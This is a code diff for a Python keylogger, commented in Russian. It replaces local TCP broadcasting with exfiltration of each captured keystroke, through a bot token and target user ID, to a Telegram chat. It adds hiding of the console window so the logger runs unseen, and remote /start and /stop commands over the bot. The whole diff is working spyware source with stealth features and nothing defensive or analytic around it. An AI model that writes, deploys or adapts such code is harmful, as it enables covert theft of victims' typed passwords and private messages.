@@ -1,67 +1,43 @@
 import ctypes
 import json
-import socket
+import os
 import sys
 import threading
 import time
 from ctypes import wintypes
-from typing import List, Optional
+from queue import Empty, Queue
+from typing import Optional
 
+import telebot
 from pynput import keyboard
 
-HOST = "0.0.0.0"
-PORT = 8765
+BOT_TOKEN = os.environ.get("SERVER_BOT_TOKEN", "YOUR_SERVER_BOT_TOKEN")
+TARGET_USER_ID = os.environ.get("TARGET_USER_ID", "123456789")
+
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
+stop_event = threading.Event()
+send_queue: Queue[str] = Queue()
 
 
-class ClientPool:
-    def __init__(self):
-        self._clients: List[socket.socket] = []
-        self._lock = threading.Lock()
+@bot.message_handler(commands=["start"])
+def start(message):
+    chat = getattr(message, "chat", None)
+    if chat is None or str(getattr(chat, "id", "")) != str(TARGET_USER_ID):
+        return
+    bot.send_message(chat.id, "Я сервер-бот. Клавиши будут приходить сюда.")
 
-    def add(self, conn: socket.socket):
-        with self._lock:
-            self._clients.append(conn)
 
-    def remove(self, conn: socket.socket):
-        with self._lock:
-            try:
-                self._clients.remove(conn)
-            except ValueError:
-                pass
-        try:
-            conn.close()
-        except OSError:
-            pass
-
-    def broadcast(self, message: str):
-        dead: List[socket.socket] = []
-        encoded = message.encode("utf-8")
-        with self._lock:
-            for conn in list(self._clients):
-                try:
-                    conn.sendall(encoded)
-                except OSError:
-                    dead.append(conn)
-            for conn in dead:
-                try:
-                    self._clients.remove(conn)
-                except ValueError:
-                    pass
-        for conn in dead:
-            try:
-                conn.close()
-            except OSError:
-                pass
-
-    def close_all(self):
-        with self._lock:
-            clients = list(self._clients)
-            self._clients.clear()
-        for conn in clients:
-            try:
-                conn.close()
-            except OSError:
-                pass
+@bot.message_handler(commands=["stop"])
+def stop(message):
+    chat = getattr(message, "chat", None)
+    if chat is None or str(getattr(chat, "id", "")) != str(TARGET_USER_ID):
+        return
+    if stop_event.is_set():
+        return
+    stop_event.set()
+    send_queue.put(None)
+    bot.stop_polling()
+    bot.send_message(chat.id, "Останавливаем сервер")
 
 
 _user32 = None
@@ -270,68 +246,81 @@ def key_to_str(key):
     return None
 
 
-def on_press_factory(pool: ClientPool, stop_event: threading.Event):
-    def on_press(key):
-        if stop_event.is_set():
-            return False
-        key_str = key_to_str(key)
-        if key_str is None:
-            return True
-        payload = json.dumps({"type": "key", "key": key_str, "ts": time.time()}) + "\n"
-        pool.broadcast(payload)
-        return True
+def _hide_console_window():
+    if sys.platform != "win32":
+        return
+    stdin = getattr(sys, "stdin", None)
+    if stdin is not None and hasattr(stdin, "isatty") and stdin.isatty():
+        return
+    if _user32 is None or _kernel32 is None:
+        return
+    hwnd = _kernel32.GetConsoleWindow()
+    if hwnd:
+        _user32.ShowWindow(hwnd, 0)
 
-    return on_press
 
-
-def accept_connections(server_socket: socket.socket, pool: ClientPool, stop_event: threading.Event):
-    server_socket.settimeout(1.0)
+def _send_worker():
     while not stop_event.is_set():
         try:
-            conn, addr = server_socket.accept()
-        except socket.timeout:
+            payload = send_queue.get(timeout=0.5)
+        except Empty:
             continue
-        except OSError:
+        if payload is None:
             break
-        conn.settimeout(None)
-        pool.add(conn)
-        print(f"[server] клиент подключен: {addr}")
+        try:
+            bot.send_message(TARGET_USER_ID, payload)
+        except Exception:
+            time.sleep(1)
+
+
+def on_press(key):
+    if stop_event.is_set():
+        return False
+    key_str = key_to_str(key)
+    if key_str is None:
+        return True
+    payload = json.dumps({"type": "key", "key": key_str, "ts": time.time()})
+    send_queue.put(payload)
+    return True
+
+
+def _run_bot_polling():
+    while not stop_event.is_set():
+        try:
+            bot.infinity_polling(timeout=10, long_polling_timeout=30)
+        except Exception:
+            if stop_event.is_set():
+                break
+            time.sleep(3)
+        else:
+            break
 
 
 def main():
-    stop_event = threading.Event()
-    pool = ClientPool()
+    _hide_console_window()
 
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_socket.bind((HOST, PORT))
-    server_socket.listen()
-    print(f"[server] слушаем {HOST}:{PORT}")
+    sender = threading.Thread(target=_send_worker, daemon=True)
+    sender.start()
 
-    accept_thread = threading.Thread(
-        target=accept_connections, args=(server_socket, pool, stop_event), daemon=True
-    )
-    accept_thread.start()
+    bot_thread = threading.Thread(target=_run_bot_polling, daemon=True)
+    bot_thread.start()
 
-    listener = keyboard.Listener(on_press=on_press_factory(pool, stop_event))
+    listener = keyboard.Listener(on_press=on_press)
     listener.start()
 
     try:
-        while not stop_event.wait(0.1):
+        while not stop_event.wait(0.2):
             pass
     except KeyboardInterrupt:
         stop_event.set()
+        send_queue.put(None)
     finally:
         listener.stop()
         listener.join()
-        stop_event.set()
-        try:
-            server_socket.close()
-        except OSError:
-            pass
-        pool.close_all()
-        accept_thread.join()
-        print("[server] остановлен")
+        bot.stop_polling()
+        bot_thread.join()
+        send_queue.put(None)
+        sender.join()
 
 
 if __name__ == "__main__":
